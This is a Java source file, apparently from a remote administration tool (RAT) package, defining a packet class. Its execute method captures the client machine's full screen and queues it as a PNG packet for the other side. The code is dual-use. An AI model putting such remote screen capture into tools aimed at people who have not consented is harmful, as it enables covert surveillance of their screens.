package de.sogomn.rat.packet.request;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;

import de.sogomn.rat.ActiveClient;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.ImagePacket;

public final class ScreenshotRequestPacket implements IPacket {
	
	public ScreenshotRequestPacket() {
		//...
	}
	
	@Override
	public void send(final ActiveClient client) {
		//...
	}
	
	@Override
	public void receive(final ActiveClient client) {
		//...
	}
	
	@Override
	public void execute(final ActiveClient client) {
		final Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
		final Rectangle screenRect = new Rectangle(screen);
		
		try {
			final Robot robot = new Robot();
			final BufferedImage image = robot.createScreenCapture(screenRect);
			final ImagePacket packet = new ImagePacket(image, "PNG");
			
			client.addPacket(packet);
		} catch (final AWTException ex) {
			ex.printStackTrace();
		}
	}
	
}
